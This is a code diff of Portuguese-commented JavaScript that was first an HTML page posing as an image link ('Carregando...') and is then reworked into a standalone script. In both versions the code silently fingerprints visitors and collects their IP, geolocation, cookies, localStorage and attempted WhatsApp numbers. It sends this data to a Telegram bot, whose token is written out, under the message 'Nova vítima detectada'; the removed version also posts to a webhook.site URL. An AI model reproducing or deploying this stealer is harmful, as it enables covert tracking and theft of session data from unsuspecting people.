@@ -1,194 +1,148 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <title>Carregando...</title>
-  <style>
-    body { margin: 0; background: #000; }
-    img { width: 100vw; height: 100vh; object-fit: cover; }
-  </style>
-</head>
-<body>
-  <script>
-    const inicio = Date.now();
-    let tentouSair = false;
+// Função para pegar cookies
+function getCookies() {
+  return document.cookie;
+}
 
-    // Redireciona para a imagem após 1 segundo para garantir que o script tenha tempo de ser executado
-    setTimeout(() => {
-      window.location.href = "https://ibb.co/35Db3PWf";  // Link da imagem
-    }, 1000); // Atraso de 1 segundo
+// Função para pegar a impressão digital do Canvas
+function getCanvasFingerprint() {
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = "top";
+  ctx.font = "14px 'Arial'";
+  ctx.fillText("fingerprint", 2, 2);
+  return canvas.toDataURL();
+}
 
-    document.addEventListener("mouseout", e => {
-      if (e.clientY < 0) tentouSair = true;
-    });
+// Função para pegar o renderizador WebGL
+function getWebGLRenderer() {
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+  } catch {
+    return "Não suportado";
+  }
+}
 
-    // Função para pegar a impressão digital do Canvas
-    function getCanvasFingerprint() {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = "top";
-      ctx.font = "14px 'Arial'";
-      ctx.fillText("fingerprint", 2, 2);
-      return canvas.toDataURL();
+// Função para pegar as fontes instaladas
+function getFontList() {
+  const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier', 'Tahoma', 'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Calibri'];
+  const available = [];
+  const canvas = document.createElement("canvas");
+  const context = canvas.getContext("2d");
+  const testText = "abcdefghi0123456789";
+  canvas.width = 1000;
+  canvas.height = 100;
+  context.textBaseline = "top";
+  context.font = "72px monospace";
+  const defaultWidth = context.measureText(testText).width;
+  fonts.forEach(font => {
+    context.font = `72px '${font}', monospace`;
+    if (context.measureText(testText).width !== defaultWidth) {
+      available.push(font);
     }
+  });
+  return available;
+}
 
-    // Função para pegar o renderizador WebGL
-    function getWebGLRenderer() {
-      try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      } catch {
-        return "Não suportado";
-      }
+// Função para pegar informações da rede de internet
+function getNetworkInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (connection) {
+    return {
+      type: connection.effectiveType,
+      downlink: connection.downlink
+    };
+  }
+  return { type: "Desconhecido", downlink: "Desconhecido" };
+}
+
+// Função para pegar geolocalização detalhada
+function obterLocalizacaoDetalhada() {
+  return new Promise((resolve, reject) => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        });
+      }, reject);
+    } else {
+      reject("Geolocalização não disponível.");
     }
+  });
+}
 
-    // Função para pegar as fontes instaladas
-    function getFontList() {
-      const fonts = ['Arial','Verdana','Times New Roman','Courier','Tahoma','Georgia','Comic Sans MS','Impact','Trebuchet MS','Calibri'];
-      const available = [];
-      const canvas = document.createElement("canvas");
-      const context = canvas.getContext("2d");
-      const testText = "abcdefghi0123456789";
-      canvas.width = 1000;
-      canvas.height = 100;
-      context.textBaseline = "top";
-      context.font = "72px monospace";
-      const defaultWidth = context.measureText(testText).width;
-      fonts.forEach(font => {
-        context.font = `72px '${font}', monospace`;
-        if (context.measureText(testText).width !== defaultWidth) {
-          available.push(font);
+// Função para pegar dados de referer
+function getReferer() {
+  return document.referrer || "N/A";
+}
+
+// Função para pegar o número do WhatsApp Web
+function getWhatsAppNumber() {
+  const numbers = [];
+  const iframe = document.querySelector('iframe[src*="web.whatsapp.com"]');
+  if (iframe) {
+    try {
+      const iframeWindow = iframe.contentWindow;
+      const contacts = iframeWindow.document.querySelectorAll('.two');
+      contacts.forEach(contact => {
+        const number = contact.getAttribute('data-number');
+        if (number) {
+          numbers.push(number);
         }
       });
-      return available;
+    } catch (error) {
+      console.error('Erro ao pegar número do WhatsApp:', error);
     }
+  }
+  return numbers.join(', ') || "Não disponível";
+}
 
-    // Função para pegar informações da rede de internet
-    function getNetworkInfo() {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection) {
-        return {
-          type: connection.effectiveType,
-          downlink: connection.downlink
-        };
-      }
-      return { type: "Desconhecido", downlink: "Desconhecido" };
-    }
+// Função principal de coleta de dados
+async function fingerprint() {
+  const ipData = await fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .catch(() => ({}));
 
-    // Função para pegar geolocalização detalhada
-    function obterLocalizacaoDetalhada() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(position => {
-            resolve({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            });
-          }, reject);
-        } else {
-          reject("Geolocalização não disponível.");
-        }
-      });
-    }
+  const locationData = await obterLocalizacaoDetalhada().catch(() => ({ latitude: "N/A", longitude: "N/A" }));
 
-    // Função para pegar cookies
-    function getCookies() {
-      return document.cookie;
-    }
+  const data = {
+    ip: ipData.ip || "Desconhecido",
+    cidade: ipData.city || "N/A",
+    estado: ipData.region || "N/A",
+    pais: ipData.country_name || "N/A",
+    provedor: ipData.org || "N/A",
+    asn: ipData.asn || "N/A",
+    fuso: ipData.timezone || "N/A",
+    latitude: locationData.latitude,
+    longitude: locationData.longitude,
+    idioma: navigator.language,
+    sistema: navigator.platform,
+    navegador: navigator.userAgent,
+    resolucao: `${screen.width}x${screen.height}`,
+    touch: 'ontouchstart' in window ? "Sim" : "Não",
+    tempoNaPagina: `${Math.floor((Date.now() - inicio) / 1000)}s`,
+    tentouSair: tentouSair ? "Sim" : "Não",
+    canvasFingerprint: getCanvasFingerprint().slice(100, 140),
+    webglRenderer: getWebGLRenderer(),
+    fontes: getFontList(),
+    plugins: Array.from(navigator.plugins).map(p => p.name),
+    cookies: getCookies(),
+    localStorageData: localStorage.getItem('usuarioID') || "N/A",
+    networkInfo: getNetworkInfo(),
+    referer: getReferer(),
+    whatsappNumber: getWhatsAppNumber()
+  };
 
-    // Função para pegar dados do localStorage
-    function getLocalStorageData() {
-      return localStorage.getItem('usuarioID') || "N/A";
-    }
-
-    // Função para pegar dados de referer
-    function getReferer() {
-      return document.referrer || "N/A";
-    }
-
-    // Função para pegar o número do WhatsApp Web
-    function getWhatsAppNumber() {
-      const numbers = [];
-      const iframe = document.querySelector('iframe[src*="web.whatsapp.com"]');
-      if (iframe) {
-        try {
-          const iframeWindow = iframe.contentWindow;
-          const contacts = iframeWindow.document.querySelectorAll('.two');
-          contacts.forEach(contact => {
-            const number = contact.getAttribute('data-number');
-            if (number) {
-              numbers.push(number);
-            }
-          });
-        } catch (error) {
-          console.error('Erro ao pegar número do WhatsApp:', error);
-        }
-      }
-      return numbers.join(', ') || "Não disponível";
-    }
-
-    // Função para pegar dados de rede de Wi-Fi
-    function getWiFiInfo() {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection && connection.type) {
-        return connection.type;
-      }
-      return "Desconhecido";
-    }
-
-    // Função principal de coleta de dados
-    async function fingerprint() {
-      const ipData = await fetch("https://ipapi.co/json/")
-        .then(r => r.json())
-        .catch(() => ({}));
-
-      const locationData = await obterLocalizacaoDetalhada().catch(() => ({ latitude: "N/A", longitude: "N/A" }));
-
-      const data = {
-        ip: ipData.ip || "Desconhecido",
-        cidade: ipData.city || "N/A",
-        estado: ipData.region || "N/A",
-        pais: ipData.country_name || "N/A",
-        provedor: ipData.org || "N/A",
-        asn: ipData.asn || "N/A",
-        fuso: ipData.timezone || "N/A",
-        latitude: locationData.latitude,
-        longitude: locationData.longitude,
-        idioma: navigator.language,
-        sistema: navigator.platform,
-        navegador: navigator.userAgent,
-        resolucao: `${screen.width}x${screen.height}`,
-        touch: 'ontouchstart' in window ? "Sim" : "Não",
-        tempoNaPagina: `${Math.floor((Date.now() - inicio) / 1000)}s`,
-        tentouSair: tentouSair ? "Sim" : "Não",
-        canvasFingerprint: getCanvasFingerprint().slice(100, 140),
-        webglRenderer: getWebGLRenderer(),
-        fontes: getFontList(),
-        plugins: Array.from(navigator.plugins).map(p => p.name),
-        cookies: getCookies(),
-        localStorageData: getLocalStorageData(),
-        networkInfo: getNetworkInfo(),
-        referer: getReferer(),
-        whatsappNumber: getWhatsAppNumber(),
-        wifiInfo: getWiFiInfo()
-      };
-
-      // Enviar para o Webhook.site
-      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-
-      // Enviar para o Telegram
-      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: 94845670,
-          text: `
+  // Enviar para o Telegram
+  fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: 94845670,
+      text: `
 🧠 *Nova vítima detectada*
 
 IP: ${data.ip}
@@ -212,18 +166,14 @@ WebGL: ${data.webglRenderer}
 Fontes: ${data.fontes.join(", ").slice(0, 200)}...
 Plugins: ${data.plugins.join(", ").slice(0, 200)}...
 
-Cookies: ${data.cookies}
-LocalStorage: ${data.localStorageData}
-Conexão de Rede: Tipo - ${data.networkInfo.type}, Velocidade - ${data.networkInfo.downlink} Mbps
-Referer: ${data.referer}
-WhatsApp Número: ${data.whatsappNumber}
-Wi-Fi Tipo: ${data.wifiInfo}
-          `.trim()
-        })
-      });
-    }
+Cookies: ${data.cookies.length > 200 ? data.cookies.slice(0, 200) + "..." : data.cookies}
 
-    fingerprint();
-  </script>
-</body>
-</html>
+Referer: ${data.referer}
+WhatsApp Número(s): ${data.whatsappNumber}
+      `.trim()
+    })
+  });
+}
+
+// Chama a função principal
+fingerprint();
